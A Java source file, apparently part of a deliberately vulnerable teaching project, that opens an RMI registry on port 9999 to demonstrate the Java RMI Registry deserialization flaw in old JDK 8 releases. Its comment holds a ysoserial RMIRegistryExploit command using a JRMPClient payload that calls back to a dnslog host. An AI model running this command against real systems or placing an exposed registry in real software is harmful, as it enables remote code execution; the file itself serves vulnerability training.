package com.best.hello.controller.RMI;

import java.rmi.registry.LocateRegistry;


public class RegistryVul {

    /**
     * Java RMI Registry 反序列化漏洞，JDK<=jdk8u111
     * 检测：java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit ip 9999 JRMPClient "rmi.c3blgk.dnslog.cn"
     */
    public static void main(String[] args) throws Exception {
        LocateRegistry.createRegistry(9999);
        System.out.println("Registry created on port 9999");
        while (true);
    }
}
